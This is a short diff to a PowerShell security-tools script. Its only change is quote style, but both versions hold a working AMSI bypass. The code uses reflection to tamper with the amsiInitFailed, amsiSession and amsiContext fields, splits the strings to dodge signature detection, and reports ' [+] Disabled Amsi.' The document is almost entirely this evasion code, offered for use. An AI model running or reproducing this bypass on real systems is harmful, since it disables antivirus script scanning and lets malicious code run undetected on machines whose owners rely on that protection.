@@ -194,7 +194,7 @@ param (
 		# https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
 		$h = "`n### Invoke-DefenderTools(DisableAmsi) ###`n"
 		
-		$CheckAmz = [bool](([Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiInitFailed',"NonPublic,Static").GetValue($null)))
+		$CheckAmz = [bool](([Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiInitFailed','NonPublic,Static').GetValue($null)))
 		
 		if ($CheckAmz -eq $False) {
 			
@@ -202,9 +202,9 @@ param (
 			
 				$a = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
 			
-				[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiSession',"NonPublic,Static").SetValue($null,$null)
+				[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiSession','NonPublic,Static').SetValue($null,$null)
 			
-				[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiContext',"NonPublic,Static").SetValue($null, [IntPtr]$a)
+				[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiContext','NonPublic,Static').SetValue($null, [IntPtr]$a)
 				
 				$h
 				Write " [+] Disabled Amsi."
